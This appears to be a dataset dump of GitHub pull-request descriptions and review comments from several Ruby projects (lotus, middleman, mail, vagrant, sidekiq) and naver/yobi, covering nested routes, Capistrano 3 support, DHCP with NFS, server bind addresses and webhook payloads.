#       edit_user_post GET, HEAD  /users/:user_id/posts/:id/edit Users::Posts::Edit            
#            user_post PATCH      /users/:user_id/posts/:id      Users::Posts::Update          
#            user_post DELETE     /users/:user_id/posts/:id      Users::Posts::Destroy         
#                users GET, HEAD  /users                         Users::Index                  
#             new_user GET, HEAD  /users/new                     Users::New                    
#                users POST       /users                         Users::Create                 
#                 user GET, HEAD  /users/:id                     Users::Show                   
#            edit_user GET, HEAD  /users/:id/edit                Users::Edit                   
#                 user PATCH      /users/:id                     Users::Update                 
#                 user DELETE     /users/:id                     Users::Destroy
```


","['close #47 ', 'Thank you for this @AlfonsoUceda !', '@jodosha @joneslee85 when you have time, can you review this PR? thanks ;)', 'This is exactly what I needed. Thanks @AlfonsoUceda!', ""Hey @AlfonsoUceda, it looks like nested routes lack the ability to accept options:\r\n\r\n``` ruby\r\nrouter.define do\r\n  resources 'products' do\r\n    resources 'variants', only: [:index, :show]\r\n  end\r\nend\r\n\r\n#=> ArgumentError: wrong number of arguments (2 for 1)\r\n```"", '@Erol Good catch, I am going to fix that', ':+1: ', '@Erol fixed', 'Great, thanks!', ""Hi @AlfonsoUceda, found another one. Namespaces are being dropped inside nested routes:\r\n\r\n``` ruby\r\nrouter.define do\r\n  namespace 'api' do\r\n    resources 'products' do\r\n      resources 'variants'\r\n    end\r\n  end\r\nend\r\n\r\n```\r\n\r\nHere are the routes generated:\r\n\r\n```\r\n   products_variants GET, HEAD  /products/:products_id/variants Products::Variants::Index\r\nnew_products_variants GET, HEAD  /products/:products_id/variants/new Products::Variants::New\r\n   products_variants POST       /products/:products_id/variants Products::Variants::Create\r\n   products_variants GET, HEAD  /products/:products_id/variants/:id Products::Variants::Show\r\nedit_products_variants GET, HEAD  /products/:products_id/variants/:id/edit Products::Variants::Edit\r\n   products_variants PATCH      /products/:products_id/variants/:id Products::Variants::Update\r\n   products_variants DELETE     /products/:products_id/variants/:id Products::Variants::Destroy\r\n        api_products GET, HEAD  /api/products                  Products::Index\r\n    new_api_products GET, HEAD  /api/products/new              Products::New\r\n        api_products POST       /api/products                  Products::Create\r\n        api_products GET, HEAD  /api/products/:id              Products::Show\r\n   edit_api_products GET, HEAD  /api/products/:id/edit         Products::Edit\r\n        api_products PATCH      /api/products/:id              Products::Update\r\n        api_products DELETE     /api/products/:id              Products::Destroy\r\n```"", ""thanks @Erol I'm goint to fix that"", ""Ok @Erol the problem was I wasn't merging parents options"", 'Thanks again for this @AlfonsoUceda!', 'I added more tests', '@AlfonsoUceda Thank you for this PR :100: :sparkles: \r\nCan you please add support for `member` and `collection` routes? Thank you very much!', ""@jodosha IMO add nested routes to member and collection block it doesn't make sense.\r\n\r\ncould you add an example?\r\n\r\nthanks ;)"", '@AlfonsoUceda `/admin/users/search` for `collection` and `/organizations/1/projects/123/configure` for `member`.', '@jodosha how would it be the code (routes definition)?', ""@AlfonsoUceda \r\n\r\n```ruby\r\nresources :admin do\r\n  resources :users do\r\n    collection do\r\n      get '/search'\r\n    end\r\n  end\r\nend\r\n\r\nresources :organizations do\r\n  resources :projects do\r\n    member do\r\n      get '/configure'\r\n    end\r\n  end\r\nend\r\n```\r\n\r\nWe already have support for member/collection in RESTful resource(s). Check the README."", ""I was wrong xD I thought support nested resource/resources inside member and collection block.\r\n\r\nOk I'll give support"", '@jodosha done test for collection and member', ""@AlfonsoUceda You're a machine! :clap: "", 'I think the PR is done', ':+1: ', ""@AlfonsoUceda There is one missing behavior to support: `controller:`. It was introduced with https://github.com/lotus/router/pull/45 \r\n\r\n```ruby\r\n  resources :users do\r\n    resources :posts do\r\n      resources :comments, controller: 'comments'\r\n    end\r\n  end\r\n```\r\n\r\nThis should use `Comments::Index` etc.. instead of `Users::Posts::Comments::Index`\r\nThe reason is that we support it for top level resources, so we want a feature parity with nested resources. It also helps to reuse code. Eg. If in your system both posts and reviews are commentable, you may want to reuse the same code (eg. `Comments::Create`) for both the use cases."", '@jodosha I created another router in test, because with namespaced router routes is different, you can see it at the end of the file', 'This is awesome work! :+1: ', ""@AlfonsoUceda Here's another issue. Given the following routes:\r\n\r\n```ruby\r\nresources :users do\r\n  resources :posts\r\nend\r\n```\r\n\r\n```ruby\r\n(byebug) puts @router.inspector\r\n    new_users_avatar GET, HEAD  /users/:users_id/avatar/new    Nested::Controllers::Users::Avatar::New\r\n        users_avatar POST       /users/:users_id/avatar        Nested::Controllers::Users::Avatar::Create\r\n        users_avatar GET, HEAD  /users/:users_id/avatar        Nested::Controllers::Users::Avatar::Show\r\n   edit_users_avatar GET, HEAD  /users/:users_id/avatar/edit   Nested::Controllers::Users::Avatar::Edit\r\n        users_avatar PATCH      /users/:users_id/avatar        Nested::Controllers::Users::Avatar::Update\r\n        users_avatar DELETE     /users/:users_id/avatar        Nested::Controllers::Users::Avatar::Destroy\r\n         users_posts GET, HEAD  /users/:users_id/posts         Nested::Controllers::Users::Posts::Index\r\n     new_users_posts GET, HEAD  /users/:users_id/posts/new     Nested::Controllers::Users::Posts::New\r\n         users_posts POST       /users/:users_id/posts         Nested::Controllers::Users::Posts::Create\r\n         users_posts GET, HEAD  /users/:users_id/posts/:id     Nested::Controllers::Users::Posts::Show\r\n    edit_users_posts GET, HEAD  /users/:users_id/posts/:id/edit Nested::Controllers::Users::Posts::Edit\r\n         users_posts PATCH      /users/:users_id/posts/:id     Nested::Controllers::Users::Posts::Update\r\n         users_posts DELETE     /users/:users_id/posts/:id     Nested::Controllers::Users::Posts::Destroy\r\n               users GET, HEAD  /users                         Nested::Controllers::Users::Index\r\n           new_users GET, HEAD  /users/new                     Nested::Controllers::Users::New\r\n               users POST       /users                         Nested::Controllers::Users::Create\r\n               users GET, HEAD  /users/:id                     Nested::Controllers::Users::Show\r\n          edit_users GET, HEAD  /users/:id/edit                Nested::Controllers::Users::Edit\r\n               users PATCH      /users/:id                     Nested::Controllers::Users::Update\r\n               users DELETE     /users/:id                     Nested::Controllers::Users::Destroy\r\nnil\r\n(byebug) puts @router.path(:users_posts, users_id: 1, id: 23)\r\n/users/1/posts/23\r\nnil\r\n(byebug) puts @router.path(:users_posts, users_id: 1)\r\n*** HttpRouter::InvalidRouteException Exception: No route (path) could be generated for :users_posts # THIS SHOULD BE GENERATED\r\n\r\nnil\r\n(byebug) puts @router.path(:users)\r\n/users\r\nnil\r\n(byebug) puts @router.path(:users, id: 1)\r\n/users/1\r\nnil\r\n```\r\n\r\nThere is a conflict between `:users_posts` as way to show `/users/1/posts/23` and the same name is used for `/users/1/posts`.\r\n\r\nRight now in master, we have this conflict as well, but it works fine. See the last two lines above: `:users` is used both for `/users` and `/users/23`.\r\n\r\nAt this point, instead of fixing this **I'm wondering if it's the time to introduce the right pluralization rules**. In this way it won't create conflicts, and at the same time is improves the dev experience: `users_id` for a single user is ugly.\r\n\r\nThe would become:\r\n\r\n```ruby\r\n(byebug) puts @router.inspector\r\n     new_user_avatar GET, HEAD  /users/:user_id/avatar/new     Nested::Controllers::Users::Avatar::New\r\n         user_avatar POST       /users/:user_id/avatar         Nested::Controllers::Users::Avatar::Create\r\n         user_avatar GET, HEAD  /users/:user_id/avatar         Nested::Controllers::Users::Avatar::Show\r\n    edit_user_avatar GET, HEAD  /users/:user_id/avatar/edit    Nested::Controllers::Users::Avatar::Edit\r\n         user_avatar PATCH      /users/:user_id/avatar         Nested::Controllers::Users::Avatar::Update\r\n         user_avatar DELETE     /users/:user_id/avatar         Nested::Controllers::Users::Avatar::Destroy\r\n          user_posts GET, HEAD  /users/:user_id/posts          Nested::Controllers::Users::Posts::Index\r\n       new_user_post GET, HEAD  /users/:user_id/posts/new      Nested::Controllers::Users::Posts::New\r\n          user_posts POST       /users/:user_id/posts          Nested::Controllers::Users::Posts::Create\r\n           user_post GET, HEAD  /users/:user_id/posts/:id      Nested::Controllers::Users::Posts::Show\r\n      edit_user_post GET, HEAD  /users/:user_id/posts/:id/edit Nested::Controllers::Users::Posts::Edit\r\n           user_post PATCH      /users/:user_id/posts/:id      Nested::Controllers::Users::Posts::Update\r\n           user_post DELETE     /users/:user_id/posts/:id      Nested::Controllers::Users::Posts::Destroy\r\n               users GET, HEAD  /users                         Nested::Controllers::Users::Index\r\n            new_user GET, HEAD  /users/new                     Nested::Controllers::Users::New\r\n               users POST       /users                         Nested::Controllers::Users::Create\r\n                user GET, HEAD  /users/:id                     Nested::Controllers::Users::Show\r\n           edit_user GET, HEAD  /users/:id/edit                Nested::Controllers::Users::Edit\r\n                user PATCH      /users/:id                     Nested::Controllers::Users::Update\r\n                user DELETE     /users/:id                     Nested::Controllers::Users::Destroy\r\nnil\r\n```\r\n\r\nThis would fix the problem above: `:user_posts` will generate `/users/1/posts`, while `:user_post` will have `/users/1/posts/23` as output.\r\n\r\n/cc @joneslee85 "", 'After talking with @jodosha, we agreed on introducing `Util::String#pluralize`, and inflection rules can be parsed to the constructor like:\r\n\r\n```\r\ninitialize(string, inflections = nil)\r\n```\r\n\r\nwhere inflections can be a hash `{ ""knife"" => ""knives"" }`\r\n\r\nWaiting for @jodosha to cook up a patch in lotus/utils', ""It is probably the longest PR I've ever reviewed, overall, it looks good to me""]"
329,lotus/view,48.0,"Not sure if this is the desired implementation of these methods, but it should be a starting point for enhancment and discussion.

Closes #44

cc @joneslee85, @jodosha ","['\n[![Coverage Status](https://coveralls.io/builds/1547247/badge)](https://coveralls.io/builds/1547247)\n\nCoverage increased (+0.01%) when pulling **70afcc1d68714fd3062ee79c0994b9791652cd0e on bennyklotz:master** into **b0bbb8c59c49012bce3f26c553df3b3f3957fb86 on lotus:master**.\n', '@bennyklotz sorry if I miss out on the details, i am curious about the usage of these methods', '@joneslee85 https://github.com/lotus/view/issues/44', '@bennyklotz can you please amend the commit msg so it includes `[resolve #44]`?', 'https://github.com/bennyklotz/view/commit/70afcc1d68714fd3062ee79c0994b9791652cd0e\r\n\r\nThe commit msg: "" ... - this closes #44""\r\n\r\nShould I still amend it?', 'yes please', 'done :)', '\n[![Coverage Status](https://coveralls.io/builds/1548147/badge)](https://coveralls.io/builds/1548147)\n\nCoverage increased (+0.01%) when pulling **af9f11d282fa2b151a27c250b41ebb1d9f5ae66b on bennyklotz:master** into **b0bbb8c59c49012bce3f26c553df3b3f3957fb86 on lotus:master**.\n', 'I am good with the changes but I feel uneasy that we have to introduce such changes to go around the fact we could not extend `Object`. ', '\n[![Coverage Status](https://coveralls.io/builds/1548685/badge)](https://coveralls.io/builds/1548685)\n\nCoverage increased (+0.01%) when pulling **b61492827463aba029006563e76c172f39db8e35 on bennyklotz:master** into **b0bbb8c59c49012bce3f26c553df3b3f3957fb86 on lotus:master**.\n', ':+1: ', '\n[![Coverage Status](https://coveralls.io/builds/1548818/badge)](https://coveralls.io/builds/1548818)\n\nCoverage increased (+0.01%) when pulling **bd5f4dbd0e3a7a7458106aef2d8394fcd47c9f66 on bennyklotz:master** into **b0bbb8c59c49012bce3f26c553df3b3f3957fb86 on lotus:master**.\n', '@bennyklotz It looks good now :+1: As last thing, can you please rebase? Thank you!', 'okay, :+1: ', 'Rebased, thx 2 all :heart: ', '\n[![Coverage Status](https://coveralls.io/builds/1548966/badge)](https://coveralls.io/builds/1548966)\n\nCoverage increased (+0.01%) when pulling **f15e9153af1c65b7f98ba5b62625c561db98dead on bennyklotz:master** into **b0bbb8c59c49012bce3f26c553df3b3f3957fb86 on lotus:master**.\n', '@bennyklotz Thank you, merging. :+1: ']"
330,luikore/nyara,14.0,"1. `nyara s` to start app server;
2.  Can auto require files in `app/controllers`, `app/models`;
3. Add `Nyara.config.root` to get app root directory;
4. Default views: layout, welcome page, default js,css file.",['\xe5\x8f\xa6\xe5\xa4\x96\xef\xbc\x8c\xe7\x9b\xae\xe5\x89\x8d\xe6\x96\xb0\xe5\xb0\x86\xe9\xa1\xb9\xe7\x9b\xae\xe7\x9a\x84\xe7\xbb\x93\xe6\x9e\x84\xe5\x92\x8c\xe4\xbd\xa0\xe4\xb9\x8b\xe5\x89\x8d\xe7\x94\xbb\xe9\x82\xa3\xe4\xb8\xaa\xe7\xa8\x8d\xe5\xbe\xae\xe6\x9c\x89\xe7\x82\xb9\xe4\xb8\x8d\xe5\x90\x8c\r\n```\r\napp\r\n  controllers\r\n  models\r\n  views\r\npublic\r\n  js\r\n  css\r\n  img\r\n```']
331,mbj/mutant,277.0,,[]
332,middleman/middleman,1201.0,"For the most part this is just tidying up.

Although would be good to get a :+1: on 38e51e0 and a sanity check that I'm not overlooking anything with 5700243 (eg was this intentional for some reason?)","['Seems right to me.', ""Just as a tip - it's easier to look over this sort of change if rubocop/formatting changes are in a separate PR, and if commits are squashed together into logical groups."", '@bhollis Good points will take them onboard for next time.\r\n\r\nEssentially this commit is about extracting the templates out of CLI. After which the conversation can continue as to what changes are further necessary for `v4` or what ideas we have into making this better.', ""If everything is ok @bhollis I'll squash this ready to be merged."", 'Cool, looks good. Thanks for answering my questions. :+1: ', 'Thanks @bhollis. Squashed ready for a merge :shipit:.', '\n[![Coverage Status](https://coveralls.io/builds/597132/badge)](https://coveralls.io/builds/597132)\n\nCoverage increased (+0.96%) when pulling **8e8ddbc30170b35b97d71b448b9110547a2e5c0c on templates-rejig** into **fc3658bc9de70894f91d77602b5618d78194d529 on master**.\n']"
333,middleman/middleman,1528.0,"Hi there,

some time ago @bhollis implemented 08dee580aa2c99205b8d702f54e9d9087048d612. Unfortunately this broke https://github.com/fedux-org/middleman-presentation because it used the `-h` of `middleman server`. This PR is a follow up of #1516.

The `middleman-presentation`-gem is used to serve `reveal.js`-presentations via `middleman server`  - besides some other things. As I'm connected to wifi during some talks I tend to bind the server to `localhost` to prevent it to be public available.

I would like to appreciate to make it possible for users to explicitly define a bind address again. This PR implements this again + a name resolution for the given bind address.

BTW:
Is `middlmean` a project using http://semver.org? Can I be sure that breaking changes only happen on major or a least on minor versions (minor versions during transition to v4).

Ping @tdreyno as well.","['\n[![Coverage Status](https://coveralls.io/builds/2634027/badge)](https://coveralls.io/builds/2634027)\n\nCoverage increased (+0.0%) to 93.21% when pulling **2537c7ced25b67f476ecea85e54d706d2dada547 on maxmeyer:feature/listener** into **f2f82a4ff9f78a857158b263d964986f43712231 on middleman:v3-stable**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2634027/badge)](https://coveralls.io/builds/2634027)\n\nCoverage increased (+0.0%) to 93.21% when pulling **2537c7ced25b67f476ecea85e54d706d2dada547 on maxmeyer:feature/listener** into **f2f82a4ff9f78a857158b263d964986f43712231 on middleman:v3-stable**.\n', '\n[![Coverage Status](https://coveralls.io/builds/2634027/badge)](https://coveralls.io/builds/2634027)\n\nCoverage increased (+0.0%) to 93.21% when pulling **2537c7ced25b67f476ecea85e54d706d2dada547 on maxmeyer:feature/listener** into **f2f82a4ff9f78a857158b263d964986f43712231 on middleman:v3-stable**.\n', '@maxmeyer We are ""semver-ish"". Basically, I\'m fine adding new features in patch releases. A functional change, that may have side-effects would bump minor (see the i18n link_to changes). Complete feature removal or API change in the major level.', ""I'll let @Arcovion and @bhollis decide on this PR since they're way more familiar with the bind stuff"", 'The *default* `bind_address` needs to be `0.0.0.0`, else this breaks `localhost:4567` on Windows.', ""That's not clear to me. Does `localhost` not work, if `middleman` listens on 127.0.0.1?"", ""The default here is binding to `public_ip`, which is not `127.0.0.1`.\r\n\r\nSo `bundle exec middleman` &rarr; `PublicIP:4567` works, `Hostname:4567` works but `Localhost:4567` doesn't work so this isn't backwards-compatible.\r\n\r\nUsing `bundle exec middleman -b 127.0.0.1` works for `localhost`, but then the `PublicIP:4567` doesn't work.\r\n\r\n`bundle exec middleman -b 0.0.0.0` works with everything, so this should remain the default and you can use `-b` to limit it to `localhost` or whatever."", 'Please forget about my last comment. I think I understand now. Will fix this.', 'Before this commit the `bind_address` was unset, which defaults to `nil`. \r\nThat means [""0.0.0.0 or ::""](http://docs.ruby-lang.org/ja/2.0.0/method/WEBrick=3a=3aConfig/c/HTTP.html), so set it to `nil` by default and not `0.0.0.0` - to support IPv6.', ""Partly related, I think it's important that middleman listens to localhost by default (instead of 0.0.0.0 i.e. every machine on the network). Listening on 0.0.0.0 is a security issue and not only a theoretical one \xe2\x80\x94 people often work in coffeeshops, on wifi-airplanes etc.\r\n\r\nRails/rack worked through a similar issue a while back: https://github.com/rack/rack/commit/28b014484a8ac0bbb388e7eaeeef159598ec64fc"", 'I added the first tests and some rough ideas how to build the additional class(es). I think there are still some missing tests, e.g. for IPv6. Any feedback is welcome. :smile:', '\n[![Coverage Status](https://coveralls.io/builds/2653264/badge)](https://coveralls.io/builds/2653264)\n\nCoverage decreased (-27.82%) to 65.38% when pulling **7c098cfda0bac322716460b3f3b1a7096e058fb2 on maxmeyer:feature/listener** into **f2f82a4ff9f78a857158b263d964986f43712231 on middleman:v3-stable**.\n', 'A config option for `bind` should be exposed in v4 to go with `host` and `port`: https://github.com/middleman/middleman/commit/a71589becde156b87968d63a5087e16c5ea5c5d6\r\n', ""@sandstrom I am okay with that, since it's going to be easy to configure after this PR is merged.\r\nAs long as we add documentation that it needs to be changed in order to to test sites on multiple devices with wifi etc.\r\nPing @bhollis "", 'FYI: I\'m working on some code in [`aruba`](https://github.com/cucumber/aruba/pull/257/) which will hopefully make testing `middleman server` easier. I\'m not aware of any tests for the server-command of middleman and would like to add some more tests before changing that command again.\r\n\r\nThe idea is to provide a feature/scenario like\r\n\r\n```cucumber\r\nGiven I run `middleman server` interactively\r\nand I stop it when the output contains:\r\n""""""\r\n== Middleman\r\n""""""\r\n```\r\n\r\nWould such a step a helpful addition from your point of view? ', '@maxmeyer Can you rebase?', ""No problem. Will do this in the next couple of days. For now I'm a bit short of time."", 'Cool. Thanks. Going to push `3.4.0` when this is stable.', 'Rebased, but still not finished. WIP.', 'Would really like to get `v3.4.0` out the door. Is the github version, with the initial attempts at this feature, currently broken?', 'Yes. it is. Was short of time. Sorry for that. Will try to build it tomorrow. Would that be ok for you?', ""@maxmeyer I would appreciate it. I'm going on holiday for 2 weeks starting Friday. Was hoping to get this out the door by then."", 'Ok. I will do my best :smile: This was/is a little bit more complicated than expected... I need to add some reliable name resolution which make use of /etc/hosts + the windows thing plus a lot of code to handle errors.', 'Tokaido has this: https://github.com/tokaido/tokaido-dns', 'Thanks, but no need for this. `ruby-core` has everything I needed. I wrapped it in a [single class](https://github.com/maxmeyer/middleman/blob/feature/listener/middleman-core/lib/middleman-core/dns_resolver.rb). Network name server is only used, if /etc/hosts does not have a matching entry.', ""@tdreyno \r\nWould be unfair to block the release too long and being not finshed then. I think it's better to merge this PR for 3.5 and not for 3.4. \r\n\r\nMerging before holidays has some risk ;-) And this is change which should be reviewed carefully: The name resolution for some error cases gives me some headaches actually. I think I need some more time to wrap my head around this one."", ""I agree, but then I need to back out the breaking change from before... which I'm having a hard time isolating."", 'Mmh... Which breaking change you mean?', ""Ok. Will then try harder. But I'm not sure if it will work.""]"
334,middleman/middleman-guides,362.0,"* Add basic style layout for the community section
* Add community icons
* Change layout of the community section
* Add button to section and clean up responsive style
* Uncomment social links in landing page
* Move stylesheets to modules folder
* Add global nav partial to index and featured social media links
* Remove community icons and restructure community section
* Add width to subtitle, call in locales, and reduce font size
* Reduce footer `p` size

![screen shot 2014-11-06 at 5 06 35 pm](https://cloud.githubusercontent.com/assets/5547897/4946866/64244224-661a-11e4-810d-00070b891be7.png)
",[]
335,middleman/middleman-guides,374.0,"* Add responsiveness, text styling, first pass layout
* Scope border-bottom on h1's to .main class
* Clean up references to global nav partial
* replace border bottoms with HRs, WIP
* Refactor class naming system
* Style hr tags
* Separate styling for community preview on landing page from community page
* Update responsive styling for forum section of community page
* Style logo section
* Add logo section as a partial
* Change `container` class to `wrap-container`
* Add logo partial to landing page, create button mixins

https://trello.com/c/lgtX08mv

![landing page](https://cloud.githubusercontent.com/assets/5547897/5094394/58446d5e-6f15-11e4-95f0-9faf956afd01.png)

![community page](https://cloud.githubusercontent.com/assets/5547897/5094406/720aaf78-6f15-11e4-8c55-100b262d17a1.png)

","['Nice! Would definitely prefer the ""Using Middleman"" section on the homepage though.', ""@tdreyno no problem! It's in a partial, so we could either have it appear on both the community page and homepage, or just the homepage. Thoughts? (It needs some more margin-bottom as well, to give it some breathing room)"", ""Maybe we can do companies on the homepage and something more like this (http://middlemanapp.com/community/built-using-middleman/) on the community. It's a place anyone can add their site."", 'Nice work! Feel free to merge into `v4`.']"
336,mikel/mail,776.0,"@bf4 @jeremy @mikel 

also some performance/GC improvements","['test failure is just random time failure, good to go ?', 'Nice, so clean.', 'good to go ?', ':+1: ']"
337,mikel/mail,785.0,"I'm mostly working on inbound mail and I need to do a lot of guessing / non-perfect conversions that are a little to buggy for to integrate here, having this api would allow me to throw away a bunch of monkeypatches.

@bf4 @jeremy @mikel 

","['Implemented all the feedback, looking good ?\r\n(not really sure why we need an instance if it does not have state, but either way is fine for me ...)', 'travis error is just a random failure again, good to go @jeremy  ?', 'Nice work @grosser :heart:']"
338,mikel/mail,796.0,"fixes #755 

@jeremy @bf4 @mikel ","['@jeremy can I haz merge ?', 'Looks fine to me.  Have you taken a look at https://github.com/mikel/mail/issues/812 by any chance?', 'good to merge ?', '@jeremy good to go ?', 'is this good to go now ?', 'Thank you @grosser :heart: ', 'thanks for merging, 1 less hack in our project :)']"
339,mitchellh/vagrant,2560.0,"Previously, we required a host-only interface with a static IP for NFS
to work in VirtualBox, because we needed access to the guest's IP in
order to properly configure mount commands.

After boot, VirtualBox exposes the IP addresses of a guest's network
adapters via the ""guestproperty"" interface.

This adds support for reading VirtualBox guest properties to the
VirtualBox driver and utilizes that support to prepare NFS settings,
which removes the necessity for a static IP for NFS to work.

The `read_guest_property` implementation is the same for all versions of
the virtualbox driver, and it is more of a ""plumbing"" sort of method, so
we add it to Base and test it there.

The `read_guest_ip` methods are also identical in every vbox driver
version, but to follow convention found in similar externally accessed
methods, we add copies to each version.

In this commit we also start building out scaffolding for unit testing
vbox actions and drivers.

Test plan:
 - Prepare a Vagrantfile with the following:
   * private network with type: :dhcp
   * synced folder with nfs: true
 - Boot a VM from this Vagrantfile using the virtualbox provider
 - Machine should boot successfully with working synced folder","[""So this is another step in my plan to Let Everybody Forget About IPs. :grinning: \r\n\r\n[Landrush](https://github.com/phinze/landrush) recently [removed static IPs as a prereq](https://github.com/phinze/landrush/commit/a3e4df85b2303939057b63922a3fd09e310da59f), however this vagrant limitation caused that to break NFS. But the limitation is unnecessary if we use `guestproperty` to get the IP. Hooray!\r\n\r\nThis diff is much larger than I'd like it to be, mostly because there's a lot of test scaffolding that I had to set up to get unit tests in place. There are plenty of stylistic mini-decisions I had to make, so feel free to poke and prod at this stuff. :point_left: \r\n"", 'I commented in quite a few places but otherwise that this is looking REALLY good. Great job! :)', 'Cool - thanks for the review! Your comments all totally make sense - will push with revisions today.', 'Okay repushed with reviews squashed - let me know if this looks okay. :ok_hand: ', ""Yep this looks great. I'm going to merge it. :)""]"
340,mitchellh/vagrant,4882.0,"Most users trying DHCP with VirtualBox end up hitting #3083 and become sad.

Here we have two commits which should make them happy again!

Much more detail in the commit messages - happy to tweak and rework as needed - feedback welcome. :cake: 

Looking forward to getting that sucker closed! :dancers: ","['Looks good + great tests.\r\n\r\nIt does seem like the build is failing though. Do you mind taking a look please?', 'Thanks for the review! Dang I thought I had fixed the build. Checking it out and making the tweaks as you mentioned above.', 'Ok @sethvargo I think this should be ready to go now. Let me know if you agree :ok_hand: ', ':+1: I say we merge this and finally fix #3083 :smile: ', ':balloon: ']"
341,mitchellh/vagrant,5130.0,"In 5903bfb3c6f767f05ad9f1c4c6ef5237de039ea8, we added validation for global configuration, but that does not actually invoke the individual push validations. As a result, the push-specific configs were never validated. The tests did not catch this because they test at a lower level and manually call `#validate`.

This is the root cause of `vagrant push` with the Atlas strategy not choosing the login token, since the login token is actually [set during validation](https://github.com/mitchellh/vagrant/blob/42b7f13790c779671e472010ac988c3401efc593/plugins/pushes/atlas/config.rb#L87-L94) because we require access to the machine object.

This PR also adds much-needed logging to `vagrant-login`.

/cc @mitchellh @pearkes ","['@mitchellh re-review please? I switched to validating in the global config and updated the test to ensure the right error is happening.', 'Seth, LGTM.']"
342,mperham/sidekiq,1254.0,"This patch adds support for capistrano V3.  No existing files were modified.  Just new V3 specific files added.

To get it working (assuming bundler is being used) add the following to Capfile:

```
require 'sidekiq/capistrano3'
```

And this to config/deploy.rb:

```
SSHKit.config.command_map[:sidekiq] = ""bundle exec sidekiq""
SSHKit.config.command_map[:sidekiqctl] = ""bundle exec sidekiqctl""
```

The above works around an issue with SSHKit that prevents it from changing to the correct directory if the first string of the command to be executed contains spaces.  Not ideal, but it's life for now.

I can update the Wiki with links/instructions once you merge it if you'd like.","['Thanks for this!', 'Should `require \'sidekiq/capistrano\'` check capistrano versions and include the proper code?  I don\'t necessarily like littering code with versions in it (i.e. ""capistrano3"").\r\n', 'It could.  My thinking was to keep it 100% isolated from the existing code so as not to have any side effects.', ""I don't want the user to have to choose which version to use.  If they upgrade Capistrano, the Sidekiq recipes should just work."", ""@mperham Fair enough.  I've modified the files to load up the right capistrano code based on it's version."", 'Nice, thanks so much for this.  Would you please update the Deployment wiki page with the SSHKit notes?', 'Oh, and if you want to update the changelog to give yourself credit, please do.']"
343,mperham/sidekiq,1408.0,"`sidekiq -q high,2,low` and `sidekiq -q high,2 -q low` now both result in the `:strict` option being `false`. It used to erroneously be `true` for the latter.","['Whoops, looks like the `opts = { strict: true }` I set as the default in `parse_config` will override whatever the result of `parse_options` is, when a config file is provided. Gimme a sec.', 'Fixed.', '@mperham Support for the `-q foo,3,bar` syntax has been removed.', 'Thank you!']"
344,mperham/sidekiq,1875.0,,"[""In the future, don't forget to add a note about the new feature and how to use it in Changes.md."", 'This PR is broken.  None of the tabs in the header are linked now.', '![screen shot 2014-08-06 at 8 55 14](https://cloud.githubusercontent.com/assets/2911/3829609/1d23a8d2-1d82-11e4-8c42-1cb172d7fd6e.png)\r\n\r\nNeeds a revert.', 'I will fix it now.']"
345,mperham/sidekiq,1984.0," that don't have a matching heartbeat record, indicating that they're no longer alive.

Added call to this new util method in the `Scheduled::Poller.poll_interval`
method because the number of live processes is used as a multiplier for
the default wait interval.  Since the value for poll_interval is
memoized, this call to 'cleanup_dead_process_records' should only be
called once at startup.","['Look good to me after the typo fix and a commit squash. \r\ncc @mperham ', 'Force pushed the squashed commit.  Included the typo fix and changing dead_member to dead_members as an array in the test.', ""Sorry for the late reply, I was pretty busy this weekend.\r\n\r\nI'll clean this up a bit:\r\n\r\n1. The method doesn't belong in Util, it's not shared code that several different server component need.\r\n2. Extract the cleanup code from Sidekiq::ProcessSet and have that called by ProcessSet#initialize and the scheduler code."", '@mperham Super excited for this fix. Do you mind pushing it to ruby gems? It still shows the latest version as 3.2.5\r\n\r\nThanks!', ""I'm trying to slow down the frequency of Sidekiq releases, I don't want to release 3.2.6 with just this fix.  Can you set your poll_interval manually for now and check for a new version in a month or so?""]"
346,mperham/sidekiq,2099.0,Fixes issue #2098 ,"['OK, based on conversation, made some changes:\r\n\r\n1.  Dumped the refs\r\n2.  Used just sizes (not depth)\r\n3.  Used the Sidekiq::Stats object to get all queues sizes', 'Removed the queue count from the base stats endpoint.', 'Looks great.  Would you add a line to Changes.md and give yourself credit?', 'Oh, you need to update the JS to hit /stats.', 'Awesome, this is ready to merge.  Can you rebase?', 'Master has been merged back into the branch.', '@moserke Could you squash your commits ?', ""No need to squash, I'm not that obsessive about git history."", 'Thank you!']"
347,naver/yobi,905.0,"Resolves #837, #815 

-    .      ,   PR  .
-    ( ja-JP locale).      ,  .

----

, naive    Pull Request .
![viewsample](https://cloud.githubusercontent.com/assets/3176340/7785547/90751424-01cf-11e5-904f-9f654ed58a07.png)
 push   hook   , request  URL / secret token    view   settings   .

push    hook Header/Body   .
```
[Header]
Content-Type: application/json; charset=utf-8
Connect-Time: 1
Total-Route-Time: 0
Connection: close
Accept: */*
User-Agent: Yobi-Hookshot
X-Request-Id: 8abc3492-f9d8-4009-84ff-d06c6c9c09ca
Host: requestb.in
X-Yobi-Event: hook
Content-Length: 310
Via: 1.1 vegur

[Body]
{
    ""hook_id"":33,
    ""hook"":{
        ""id"":33,
        ""name"":""web"",
        ""active"":true,
        ""events"":[
            ""push""
        ],
        ""config"":{
            ""url"":""http://requestb.in/pzk5cnpz"",
            ""content_type"":""json"",
            ""secret"":""secret-test""
        },
        ""created_at"":""2015-05-24T04:21:26Z""
    },
    ""repository"":{
        ""id"":1,
        ""name"":""ddd"",
        ""owner"":""hello"",
        ""html_url"":""http://localhost:9000/ddd"",
        ""overview"":""dd""
    }
}
```

